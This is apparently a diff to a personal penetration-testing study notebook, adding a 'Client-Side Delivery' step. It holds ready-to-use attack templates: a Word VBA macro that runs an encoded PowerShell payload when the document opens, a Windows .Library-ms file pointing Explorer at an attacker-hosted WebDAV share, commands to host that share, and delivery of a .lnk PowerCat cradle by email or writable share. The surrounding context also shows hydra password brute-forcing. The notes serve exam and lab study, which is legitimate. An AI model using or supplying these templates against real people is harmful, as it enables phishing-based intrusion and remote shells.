@@ -70,6 +70,48 @@ hydra -L users.txt -P rockyou.txt smb://<target> -t 4
 searchsploit <software> <version>
 ```
 
+#### Step 1b: Client-Side Delivery (Macros / Library Files)
+
+For internal-only targets with nothing exposed to attack directly, get a user to run something instead. See [[Client-Side Attacks#12.2. Exploiting Microsoft Office|12.2]] (Office macros) and [[Client-Side Attacks#12.3. Abusing Windows Library Files|12.3]] (Windows library files + `.lnk`).
+
+**Office macro (VBA), scoped to the document itself, not Normal.dotm:**
+```vba
+Sub AutoOpen()
+    MyMacro
+End Sub
+Sub Document_Open()
+    MyMacro
+End Sub
+Sub MyMacro()
+    CreateObject("Wscript.Shell").Run "<base64-encoded powershell -enc payload, chunked into <=255-char Str = Str + "..." lines>"
+End Sub
+```
+Save as `.doc`/`.docm`, never `.docx` (won't persist the macro on save).
+
+**Windows library file (`.Library-ms`), points Explorer at a WebDAV share:**
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo><folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType></templateInfo>
+<searchConnectorDescriptionList><searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation><url>http://<kali_ip></url></simpleLocation>
+</searchConnectorDescription></searchConnectorDescriptionList>
+</libraryDescription>
+```
+Host the WebDAV share with `wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/`, drop a `.lnk` payload (PowerShell target, PowerCat cradle) inside it, deliver the library file separately (email or a writable share via `smbclient -c 'put'`).
+
+See [[Client-Side Attacks (Decision Tree)|Decision Tree]] for troubleshooting both, [[Client-Side Attacks (Breakdowns)|Command Breakdowns]] for the library-file XML tag-by-tag meaning.
+
+#### Tags: #ClientSideAttacks #WindowsLibraryFiles #WordMacros #WebDAV
+
+---
+
 #### Step 2: Shells & Payloads
 
 **Netcat**:
